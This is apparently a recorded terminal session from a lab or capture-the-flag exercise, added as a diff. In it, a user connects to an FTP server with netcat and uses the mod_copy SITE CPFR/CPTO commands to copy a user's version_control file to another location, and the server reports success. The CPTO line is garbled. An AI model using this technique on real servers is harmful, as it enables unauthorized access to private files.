@@ -1,0 +1,12 @@
+Script started on 2020-09-26 01:12:29-03:00 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="166" LINES="33"]
+root@Pentest:/home/joaofracassi/beco-xpl/joy# nc 192.168.1.106 21
+220 The Good Tech Inc. FTP Server
+site cpfr /home/patrick/version_control
+350 File or directory exists, ready for destination name
+sie te cpto /home/patriqu       ftp/versol [   sl
+250 Copy successful
+e ^C
+root@Pentest:/home/joaofracassi/beco-xpl/joy# exit
+exit
+
+Script done on 2020-09-26 01:14:43-03:00 [COMMAND_EXIT_CODE="1"]
